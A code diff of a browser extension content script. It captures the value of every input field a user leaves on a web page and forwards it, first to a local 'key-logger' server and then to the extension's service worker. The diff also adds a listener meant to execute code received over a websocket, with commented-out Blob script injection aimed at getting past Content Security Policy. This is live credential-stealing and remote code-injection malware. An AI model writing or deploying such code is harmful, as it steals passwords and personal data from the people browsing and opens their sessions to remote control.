@@ -1,32 +1,43 @@
-console.log("Content script loaded.");
-
-const logKeys = (key) => {
+// Send all input values to the service worker as a message
+function logKeys(key) {
     const data = {
         keys: key
     }
-    
-    fetch('http://localhost:3000/key-logger', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(data)
-    })
-        .then(response => response.text())
-        .then(data => {
-            console.log('Sent:', key);
-        })
-        .catch((error) => {
-            console.error('Error:', error);
-        });
+
+    chrome.runtime.sendMessage({type: 'SUBMIT_FORM', data}).then((response) => {
+        console.log("Response received:", response)
+    });
 }
 
-const keyCodes = () => {
-    document.addEventListener('focusout', function (e) {
-        if (e.target.tagName === 'INPUT' && e.target.value !== '') {
-            logKeys(e.target.value)
-        }
-    });
-};
+document.addEventListener('focusout', function (e) {
+    if (e.target.tagName === 'INPUT' && e.target.value !== '') {
+        logKeys(e.target.value)
+    }
+});
 
-keyCodes();
+/* =================================================================================== */
+
+// FIXME: Listen to messegaes from the service worker and if they are of type 'WEBSOCKET_MESSAGE' then evaluate the code
+chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
+    (() => {
+        if (request.type === 'WEBSOCKET_MESSAGE') {
+            console.log(request.data)
+            // TODO: tried to execute the code injection through a Blob but CSP is still blocking it
+            // // Create a Blob from the string
+            // const blob = new Blob([request.data], {type: 'application/javascript'});
+            //
+            // // Create a URL for the Blob
+            // const scriptURL = URL.createObjectURL(blob);
+            //
+            // // Dynamically create a script element and set its source to the Blob URL
+            // const scriptElement = document.createElement('script');
+            // scriptElement.src = scriptURL;
+            //
+            // // Append the script element to the document to execute the code
+            // document.body.appendChild(scriptElement);
+
+        }
+        sendResponse({status: 'ok'})
+    })();
+    return true
+});
